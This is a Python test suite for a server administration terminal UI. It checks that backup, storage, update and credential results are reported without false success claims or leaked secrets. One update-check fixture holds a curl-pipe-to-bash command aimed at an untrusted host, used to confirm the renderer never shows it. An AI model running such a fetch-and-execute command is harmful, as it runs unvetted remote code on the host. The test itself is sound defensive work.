"""Meaningful result, partial completion and safe final-summary regressions."""

from pathlib import Path
import io
import json
import sys
import tempfile
import unittest
from unittest.mock import patch

sys.path.insert(0, str(Path(__file__).resolve().parents[1]))
from terminal_results import format_plain_result, format_record
import terminal_process
import terminal_ui
import terminal_views
import ui_actions


class ResultTests(unittest.TestCase):
    def rendered(self, path, record):
        return '\n'.join(format_record(path, record) or [])

    def test_storage_distinguishes_upload_integrity_from_historical_restore(self):
        result = terminal_process.present_output(
            'storage status',
            json.dumps(
                {
                    'check': 'storage_status',
                    'media_s3': False,
                    'backup_s3': True,
                    'upload_verified': False,
                    'last_backup_verified': True,
                    'restore_verified': True,
                    'restore_scope': 'scheduled-history',
                    'last_restore_verified_at': '2026-10-10T14:25:00Z',
                    'manual_backup_destination': 'local',
                }
            ),
        )
        text = '\n'.join(result)
        self.assertIn('Целостность сохранённой загрузки в S3: не подтверждена', text)
        self.assertIn('10.10.2026 14:25 UTC', text)
        self.assertIn('не подтверждает последнюю загрузку', text)
        self.assertIn('на этом сервере', text)

    def test_storage_unknown_values_do_not_claim_disabled_or_verified(self):
        text = self.rendered(
            'storage status',
            {
                'check': 'storage_status',
                'media_s3': None,
                'backup_s3': None,
                'upload_verified': None,
                'last_backup_verified': True,
                'restore_verified': True,
                'restore_scope': 'scheduled-history',
                'last_restore_verified_at': 'unknown',
            },
        )
        self.assertIn('Медиа: нет данных', text)
        self.assertIn('Целостность сохранённой загрузки в S3: нет данных', text)
        self.assertIn('Проверка восстановления баз данных: нет данных', text)
        self.assertNotIn('подтверждена', text)

    def test_existing_selected_backup_restore_is_independent_of_upload(self):
        text = self.rendered(
            'storage status',
            {
                'check': 'existing_storage_status',
                'upload_verified': True,
                'restore_verified': True,
                'restore_scope': 'selected-backup',
                'manual_backup_destination': 'external',
            },
        )
        self.assertIn('Восстановление выбранной внешней копии: подтверждено', text)
        self.assertIn('Ручная резервная копия сохраняется в S3', text)
        self.assertNotIn('прошлого запуска', text)

    def test_storage_error_and_partial_do_not_render_successful_summary(self):
        for outcome in ({'passed': False}, {'status': 'partial', 'passed': True}):
            text = self.rendered('storage status', {'check': 'storage_status', **outcome})
            self.assertNotIn('Целостность', text)
            self.assertTrue('не удалось' in text or 'частично' in text)

    def test_database_failure_preserves_reason_without_promising_rollback(self):
        text = self.rendered(
            'storage database connect',
            {
                'check': 'database_storage',
                'passed': False,
                'message': 'database-abort is allowed only before destination activation',
            },
        )
        self.assertIn('before destination activation', text)
        self.assertNotIn('данные и настройки сохранены', text)

    def test_explicit_failed_release_state_overrides_contradictory_success(self):
        for key in ('state', 'status'):
            for value in ('failed', 'error'):
                with self.subTest(key=key, value=value):
                    text = self.rendered(
                        'update latest',
                        {
                            'installed': '1.2.0',
                            'success': True,
                            key: value,
                        },
                    )
                    self.assertIn('не завершена', text)
                    self.assertNotIn('применено', text)

    def test_partial_outcome_wins_over_success_flag(self):
        text = self.rendered(
            'credentials vault connect',
            {
                'check': 'vault_snapshot',
                'passed': True,
                'status': 'partial',
                'message': 'private provider body',
            },
        )
        self.assertIn('частично', text)
        self.assertNotIn('проверен', text)
        self.assertNotIn('private provider body', text)

    def test_error_text_requires_matching_product_producer_and_route(self):
        for record in (
            {'check': 'sdk_response', 'passed': False, 'message': 'private provider body'},
            {'check': 'vault', 'passed': False, 'explanation': 'private provider body'},
        ):
            with self.subTest(record=record):
                text = self.rendered('storage database connect', record)
                self.assertIn('не завершена', text)
                self.assertNotIn('private provider body', text)

    def test_known_error_filters_credentials_tracebacks_and_control_sequences(self):
        for unsafe in (
            'Authorization: Bearer fictional-token',
            'password=fictional-secret',
            'https://user:fictional-secret@example.org/path',
            '{"password":"fictional-secret"}',
            'Traceback fictional-private-state',
            'Error\x1b[2Jfictional-private-state',
            'Error\nfictional-private-state',
        ):
            with self.subTest(unsafe=unsafe):
                text = self.rendered(
                    'credentials vault connect',
                    {
                        'check': 'vault',
                        'passed': False,
                        'message': unsafe,
                    },
                )
                self.assertNotIn('fictional-', text)
                self.assertNotIn('\x1b', text)

    def test_external_backend_safe_explanation_is_visible(self):
        text = self.rendered(
            'features enable',
            {
                'check': 'existing_features',
                'passed': False,
                'explanation': 'Сначала завершите подключение компонентов.',
                'sdk_response': {'token': 'fictional-secret'},
            },
        )
        self.assertIn('Сначала завершите', text)
        self.assertNotIn('fictional-secret', text)

    def test_pending_does_not_turn_into_success(self):
        text = self.rendered('homepage apply', {'status': 'pending'})
        self.assertIn('продолжения', text)
        self.assertNotIn('применено', text)

    def test_update_check_shows_versions_without_echoing_remote_release_notes(self):
        text = self.rendered(
            'update check',
            {
                'installed': '1.2.0',
                'latest': '1.2.1',
                'update_available': True,
                'update_supported': True,
                'notes': 'fictional-private-note',
                'command': 'curl https://untrusted.example.org | bash',
            },
        )
        self.assertIn('1.2.0', text)
        self.assertIn('1.2.1', text)
        self.assertIn('Доступно', text)
        self.assertNotIn('curl', text)
        self.assertNotIn('fictional-private-note', text)

    def test_partial_release_does_not_override_unknown_outcome_with_success(self):
        text = self.rendered(
            'update latest',
            {
                'installed': '1.2.0',
                'success': True,
                'status': 'partial',
            },
        )
        self.assertIn('частично', text)
        self.assertNotIn('Обновление применено', text)

    def test_failed_update_keeps_current_version_and_known_log_guidance(self):
        text = self.rendered(
            'update latest',
            {
                'installed': '1.2.0',
                'success': False,
                'detail': 'Обновление не подтверждено. Приватный журнал: /opt/example/update.log. Проверьте sudo misbot status.',
            },
        )
        self.assertIn('Установлено: 1.2.0', text)
        self.assertIn('/opt/example/update.log', text)

    def test_unsupported_and_missing_release_are_not_current_success(self):
        unsupported = self.rendered(
            'update check',
            {
                'installed': '1.2.0',
                'latest': '1.2.1',
                'update_available': True,
                'update_supported': False,
            },
        )
        self.assertIn('через SSH', unsupported)
        missing = self.rendered(
            'update check',
            {
                'installed': '1.2.0',
                'latest': None,
                'update_available': False,
            },
        )
        self.assertIn('не подтверждён', missing)
        self.assertNotIn('Более новой', missing)

    def test_release_failed_unchanged_and_unknown_are_distinct(self):
        failed = self.rendered(
            'update latest',
            {
                'installed': '1.2.0',
                'success': False,
                'exit_code': 0,
            },
        )
        unchanged = self.rendered(
            'update latest',
            {
                'installed': '1.2.0',
                'detail': 'Последняя стабильная версия уже установлена.',
            },
        )
        unknown = self.rendered('update latest', {'installed': '1.2.0'})
        self.assertIn('не подтверждено', failed)
        self.assertIn('уже установлена', unchanged)
        self.assertIn('не подтверждён', unknown)
        self.assertNotIn('применено', failed + unchanged + unknown)

    def test_schedule_never_run_does_not_inherit_systemd_default_success(self):
        text = self.rendered(
            'backup schedule status',
            {
                'check': 'backup_schedule_status',
                'resource': 'service',
                'Result': 'success',
                'execution_metadata_available': False,
            },
        )
        self.assertIn('отсутствуют', text)
        self.assertNotIn('успешен', text)

    def test_missing_timer_observation_is_not_no_scheduled_backup(self):
        missing = self.rendered(
            'backup schedule status',
            {
                'check': 'backup_schedule_status',
                'resource': 'timer',
            },
        )
        empty = self.rendered(
            'backup schedule status',
            {
                'check': 'backup_schedule_status',
                'resource': 'timer',
                'NextElapseUSecRealtime': '',
            },
        )
        self.assertIn('не получено', missing)
        self.assertNotIn('не запланирована', missing)
        self.assertIn('не запланирована', empty)

    def test_active_run_and_historical_verified_copy_stay_separate(self):
        active = self.rendered(
            'backup schedule status',
            {
                'check': 'backup_schedule_status',
                'resource': 'service',
                'ActiveState': 'activating',
                'Result': 'success',
                'execution_metadata_available': True,
            },
        )
        verified = self.rendered(
            'backup schedule status',
            {
                'check': 'backup_schedule_status',
                'configured': True,
                'enabled': True,
                'last_verified': {
                    'completed_utc': '2026-10-14T03:00:00Z',
                    'two_database_restores': True,
                },
            },
        )
        self.assertIn('выполняется', active)
        self.assertNotIn('успешен', active)
        self.assertIn('14.10.2026 03:00 UTC', verified)

    def test_schedule_disable_and_calendar_are_meaningful(self):
        text = self.rendered(
            'backup schedule disable',
            {
                'check': 'backup_schedule',
                'enabled': False,
                'changed': True,
            },
        )
        self.assertIn('выключены', text)
        text = self.rendered(
            'backup schedule external',
            {
                'check': 'existing_backup_schedule',
                'enabled': True,
                'calendar': '*-*-* 03:00:00 Europe/Moscow',
            },
        )
        self.assertIn('Europe/Moscow', text)

    def test_fetch_keeps_artifact_and_trusted_digest_without_contents(self):
        text = self.rendered(
            'backup fetch',
            {
                'check': 'external_backup_download',
                'passed': True,
                'archive': '/opt/example/downloads/backup.tar.gz',
                'archive_sha256': 'a' * 64,
                'contents': 'fictional-private-data',
            },
        )
        self.assertIn('/opt/example/downloads/backup.tar.gz', text)
        self.assertIn('a' * 64, text)
        self.assertNotIn('fictional-private-data', text)

    def test_unverified_upload_cleanup_is_not_a_verified_backup_or_confirmed_absence(self):
        text = self.rendered(
            'backup external cleanup',
            {
                'check': 'external_backup_cleanup',
                'delete_requested': True,
                'unverified_object_may_remain': True,
                'private_catalog': '/opt/example/stages/external-backups/catalog.json',
            },
        )
        self.assertIn('запрошено', text)
        self.assertIn('может оставаться', text)
        self.assertIn('не является проверенной копией', text)
        self.assertNotIn('объект удалён', text)

    def test_external_upload_does_not_claim_database_restore_was_tested(self):
        text = self.rendered(
            'backup external create',
            {
                'check': 'encrypted_external_backup',
                'passed': True,
                'object_key': 'example-backups/copy.matrix.enc',
            },
        )
        self.assertIn('целостность подтверждена', text)
        self.assertIn('не подтверждает восстановление баз данных', text)
        self.assertNotIn('создана и проверена', text)

    def test_key_creation_keeps_only_path_and_preservation_instruction(self):
        text = self.rendered(
            'backup key create',
            {
                'check': 'backup_recovery_key',
                'created': True,
                'key_file': '/root/example-backup.key',
                'key': 'fictional-secret',
            },
        )
        self.assertIn('/root/example-backup.key', text)
        self.assertIn('отдельно', text)
        self.assertNotIn('fictional-secret', text)

    def test_admin_password_recovery_and_user_forward_recovery_are_different(self):
        admin = self.rendered(
            'credentials admin recover',
            {
                'check': 'administrator_password_recovered',
                'passed': True,
            },
        )
        user = self.rendered(
            'users password recover',
            {
                'check': 'user_password_recovered',
                'passed': True,
            },
        )
        self.assertIn('прежний', admin)
        self.assertIn('нового', user)

    def test_noop_credentials_and_vault_disconnect_keep_actual_scope(self):
        noop = self.rendered(
            'credentials s3 rotate',
            {
                'check': 's3_credentials_changed',
                'passed': True,
                'changed': False,
            },
        )
        disconnected = self.rendered(
            'credentials vault disconnect',
            {
                'check': 'vault_disconnected',
                'passed': True,
                'changed': True,
                'local_files_retained': True,
                'remote_versions_retained': True,
            },
        )
        self.assertIn('не требовалась', noop)
        self.assertIn('Локальные файлы сохранены', disconnected)
        self.assertIn('Удалённые версии', disconnected)

    def test_component_recovery_does_not_claim_bot_rollback(self):
        text = self.rendered(
            'features recover',
            {
                'check': 'existing_features_recovery',
                'public_routes_restored': True,
                'bot_identity_retained': True,
            },
        )
        self.assertIn('маршруты восстановлены', text)
        self.assertIn('ключи ботов сохранены', text)

    def test_feature_status_lists_components_without_dumping_unknown_fields(self):
        text = self.rendered(
            'features status',
            {
                'check': 'existing_features',
                'enabled': True,
                'referral_bot': True,
                'federation_bot': False,
                'pending': True,
                'private_config': 'fictional-secret',
            },
        )
        self.assertIn('Бот приглашений: подключён', text)
        self.assertIn('Административный бот: не подключён', text)
        self.assertIn('продолжения', text)
        self.assertNotIn('fictional-secret', text)

    def test_read_only_probe_not_checked_is_not_a_failed_stage(self):
        text = self.rendered(
            'storage s3 check',
            {
                'schema': 1,
                'passed': True,
                'stages': [
                    {'stage': 'bucket', 'status': 'passed', 'explanation': 'Бакет доступен.'},
                    {'stage': 'write', 'status': 'not_checked'},
                ],
                'conclusion': 'Проверено чтение без изменения данных.',
            },
        )
        self.assertIn('○ Запись: не проверялось', text)
        self.assertNotIn('×', text)

    def test_progress_and_federation_continue_to_existing_renderer(self):
        self.assertIsNone(format_record('start', {'check': 'download_progress'}))
        self.assertIsNone(
            format_record('federation requests approve', {'state': 'partially_applied'})
        )

    def test_invalid_field_types_do_not_crash_or_claim_success(self):
        cases = [
            ('update check', {'installed': [], 'latest': {}, 'update_available': 'true'}),
            ('backup schedule status', {'check': 'backup_schedule_status', 'last_verified': []}),
            ('storage s3 check', {'schema': 1, 'stages': [{'stage': [], 'status': {}}]}),
            ('backup fetch', {'check': 'external_backup_download', 'passed': 'true'}),
            ('features status', {'check': [], 'passed': False, 'stage': []}),
        ]
        for path, record in cases:
            with self.subTest(path=path):
                self.assertIsInstance(format_record(path, record), list)

    def test_update_plain_rollback_reports_file_and_service_outcomes_separately(self):
        text = '\n'.join(
            format_plain_result(
                'update apply',
                'update_error Update failed; previous files restored; rollback healthy=False; inspect private logs in /opt/example/stages/update',
            )
        )
        self.assertIn('файлы программы восстановлены', text)
        self.assertIn('служб не подтверждена', text)
        self.assertIn('/opt/example/stages/update', text)

    def test_plain_summaries_do_not_capture_arbitrary_output_or_interactive_secrets(self):
        for path, line in (
            ('update apply', 'Traceback fictional-secret'),
            ('update apply', 'Authorization: Bearer fictional-secret'),
            ('update apply', 'random provider error fictional-secret'),
            ('users invitation show', 'Код приглашения: MIS-fictional-secret'),
            ('credentials admin show', 'matrix-admin: fictional-secret'),
        ):
            with self.subTest(path=path):
                self.assertEqual(format_plain_result(path, line), [])
        self.assertEqual(
            format_plain_result('update recover', 'update_recovered 1.2.0 healthy True'),
            ['Восстановлена версия 1.2.0. Проверки служб пройдены.'],
        )


class IntegrationTests(unittest.TestCase):
    def test_public_renderer_preserves_safe_error_and_next_action(self):
        result = terminal_process.present_output(
            'storage database connect',
            json.dumps(
                {
                    'check': 'database_storage',
                    'passed': False,
                    'message': 'database-abort is allowed only before destination activation',
                    'next_action': 'sudo misbot storage database recover',
                }
            ),
        )
        self.assertIn('before destination activation', '\n'.join(result))
        self.assertIn('Следующий шаг: sudo misbot storage database recover', result)
        self.assertNotIn('данные и настройки сохранены', '\n'.join(result))

    @unittest.skipIf(terminal_views.Console is None, 'Rich is optional')
    def test_fullscreen_result_keeps_update_summary_after_later_progress(self):
        frame = self.final_frame(
            'update apply',
            [
                'release_applied 1.2.1',
                'private_update_log /opt/example/stages/update/apply.log',
                json.dumps(
                    {
                        'check': 'command_progress',
                        'command': 'docker',
                        'elapsed_seconds': 5,
                        'timeout_seconds': 60,
                    }
                ),
                'Authorization: Bearer fictional-private-secret',
                'Traceback fictional-private-trace',
            ],
            0,
        )
        self.assertIn('Обновление применено: 1.2.1', frame)
        self.assertIn('/opt/example/stages/update/apply.log', frame)
        self.assertNotIn('fictional-private-secret', frame)
        self.assertNotIn('fictional-private-trace', frame)

    @unittest.skipIf(terminal_views.Console is None, 'Rich is optional')
    def test_fullscreen_error_keeps_profile_reason_after_later_record(self):
        frame = self.final_frame(
            'storage database connect',
            [
                json.dumps(
                    {
                        'check': 'database_storage',
                        'passed': False,
                        'message': 'database-abort is allowed only before destination activation',
                        'next_action': 'sudo misbot storage database recover',
                    }
                ),
                json.dumps(
                    {
                        'check': 'command_progress',
                        'command': 'docker',
                        'elapsed_seconds': 5,
                        'timeout_seconds': 60,
                    }
                ),
            ],
            1,
        )
        self.assertIn('before destination activation', frame)
        self.assertIn('sudo misbot storage database recover', frame)
        self.assertIn('Операция не завершена', frame)
        self.assertNotIn('данные и настройки сохранены', frame)

    @unittest.skipIf(terminal_views.Console is None, 'Rich is optional')
    def test_fullscreen_schedule_retains_configuration_and_execution_results(self):
        frame = self.final_frame(
            'backup schedule status',
            [
                json.dumps(
                    {
                        'check': 'backup_schedule_status',
                        'configured': True,
                        'enabled': False,
                        'last_verified': None,
                    }
                ),
                json.dumps(
                    {
                        'check': 'backup_schedule_status',
                        'resource': 'timer',
                        'NextElapseUSecRealtime': '',
                    }
                ),
                json.dumps(
                    {
                        'check': 'backup_schedule_status',
                        'resource': 'service',
                        'Result': 'success',
                        'execution_metadata_available': False,
                    }
                ),
            ],
            0,
        )
        self.assertIn('Автоматические копии: выключены', frame)
        self.assertIn('Сведения о выполненном запуске копирования отсутствуют', frame)
        self.assertNotIn('Последний запуск копирования: успешен', frame)

    @unittest.skipIf(terminal_views.Console is None, 'Rich is optional')
    def test_child_zero_explicit_failure_and_partial_cannot_reopen_updated_ui(self):
        for outcome in ({'success': False}, {'passed': True, 'status': 'partial'}):
            with self.subTest(outcome=outcome):
                frame = self.final_frame(
                    'update apply',
                    [
                        json.dumps(
                            {
                                'check': 'existing_source_update',
                                **outcome,
                            }
                        )
                    ],
                    0,
                    expected_code=1,
                    execute=True,
                )
                self.assertNotIn('Готово', frame)
                self.assertNotIn('откроется интерфейс', frame)
                self.assertTrue('не завершена' in frame or 'частично' in frame)

    @unittest.skipIf(terminal_views.Console is None, 'Rich is optional')
    def test_transient_check_failure_does_not_override_final_recovery_success(self):
        frame = self.final_frame(
            'credentials admin recover',
            [
                json.dumps({'check': 'dns', 'passed': False}),
                json.dumps({'check': 'administrator_password', 'passed': False}),
                json.dumps({'check': 'administrator_password_recovered', 'passed': True}),
            ],
            0,
        )
        self.assertIn('Восстановлен прежний пароль', frame)

    def final_frame(self, path, lines, code, *, expected_code=None, execute=False):
        from rich.console import Group

        with tempfile.TemporaryDirectory() as folder:
            base = Path(folder)
            root = base / 'installation'
            root.mkdir(mode=0o700)
            (root / 'installation.json').write_text(json.dumps({'domain': 'example.org'}))
            (base / 'misbot.py').write_text(
                'print(' + repr('\n'.join(lines)) + ')\nraise SystemExit(' + str(code) + ')\n'
            )
            console = terminal_views.Console(
                file=io.StringIO(), force_terminal=True, width=180, height=50
            )
            view = terminal_views.TerminalView(console=console)
            with patch('configuration.load', return_value={'DOMAIN': 'example.org'}):
                interface = terminal_ui.UI(
                    root,
                    source=base,
                    draft=base / 'draft.json',
                    view=view,
                    reader=lambda *_: '',
                )
            with patch.dict('os.environ', {'TERM': 'xterm'}, clear=True), view.screen():
                action = ui_actions.Action(path, 'Операция')
                if execute:
                    interface.supplied_arguments = {'source': str(base)}
                    with patch.object(interface, 'confirm', return_value=True):
                        observed = interface.execute(action)
                    self.assertFalse(getattr(interface, 'restart_requested', False))
                else:
                    observed = interface.run(path)
                    interface.show_operation_result(action, observed)
                self.assertEqual(observed, code if expected_code is None else expected_code)
                return '\n'.join(
                    ''.join(segment.text for segment in line)
                    for line in console.render_lines(Group(*view.snapshot()), pad=False)
                )


if __name__ == '__main__':
    unittest.main()
